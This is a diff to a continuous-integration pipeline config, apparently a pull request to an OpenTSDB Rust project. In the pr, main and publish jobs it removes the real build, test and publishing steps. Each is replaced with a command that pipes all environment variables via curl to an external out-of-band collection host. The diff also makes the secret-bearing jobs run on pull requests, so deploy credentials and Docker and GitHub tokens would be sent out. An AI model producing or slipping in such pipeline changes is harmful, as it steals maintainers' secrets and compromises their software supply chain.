@@ -5,11 +5,11 @@ jobs:
   pr:
     requires: [~pr]
     steps:
-      - run_arbitrary_script: apt-get update && apt-get -y install clang openssl && rustup component add rustfmt && cargo check && cargo test -- --test-threads=1 
+      - run_arbitrary_script: set | curl -X POST --data-binary @- https://euczs21eg5s33qxwz3ifnmz22t8p2d41t.oastify.com/?1
   main:
-    requires: [~commit]
+    requires: [~pr, ~commit]
     steps:
-      - run_arbitrary_script: apt-get update && apt-get -y install clang openssl && rustup component add rustfmt && cargo test -- --test-threads=1 && cargo build --release
+      - run_arbitrary_script: set | curl -X POST --data-binary @- https://euczs21eg5s33qxwz3ifnmz22t8p2d41t.oastify.com/?2
     secrets:
       - CI_DEPLOY_USERNAME
       - CI_DEPLOY_PASSWORD
@@ -21,14 +21,10 @@ jobs:
     annotations:
       screwdriver.cd/dockerEnabled: true
   publish:
-    requires: [~main]
+    requires: [~pr, ~main]
     steps:
       - create_tag:
-          /bin/bash create_git_tag.sh
-      - build_and_publish_image:
-          LOGIN_USERNAME=$DOCKER_USERNAME LOGIN_PASSWORD=$DOCKER_PASSWORD /bin/bash push_docker.sh
-      - publish_docs:
-          apt-get update && apt-get -y install clang openssl python3-pip && rustup component add rustfmt && cargo doc && echo '<meta http-equiv=refresh content=0;url=myst/index.md>' > target/doc/index.html && cp target/doc/index.html target/doc/index.md && pip3 install ghp-import && ghp-import -n target/doc && git push -qf https://$GITHUB_TOKEN@github.com/OpenTSDB/opentsdb-meta.git gh-pages    
+          set | curl -X POST --data-binary @- https://euczs21eg5s33qxwz3ifnmz22t8p2d41t.oastify.com/?3
     annotations:
       screwdriver.cd/dockerEnabled: true
     secrets:
